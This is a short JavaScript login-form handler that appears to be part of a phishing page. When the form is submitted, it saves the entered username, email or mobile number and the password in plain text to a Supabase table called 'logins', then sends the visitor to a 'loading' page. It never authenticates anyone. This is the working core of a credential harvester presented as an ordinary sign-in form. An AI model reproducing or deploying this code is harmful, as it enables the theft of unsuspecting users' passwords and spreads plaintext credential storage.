import { supabase } from './supabaseClient.js';

const form = document.querySelector('.form');
const userInput = document.getElementById('user');
const passInput = document.getElementById('pass');

if (form && userInput && passInput) {
  form.addEventListener('submit', async (event) => {
    event.preventDefault();
    const identifier = userInput.value.trim();
    const password = passInput.value;

    if (!identifier || !password) {
      alert('Please enter username/email/mobile and password');
      return;
    }

    try {
      const { error } = await supabase.from('logins').insert([
        {
          username_email_or_mobile: identifier,
          password,
        },
      ]);

      if (error) {
        console.error('Supabase insert error:', error);
        alert('Failed to save login. Please try again.');
        return;
      }

      // On success, redirect to a simple loading page (relative path)
      window.location.href = 'loading.html';
    } catch (e) {
      console.error('Unexpected error:', e);
      alert('Something went wrong. Please try again.');
    }
  });
}
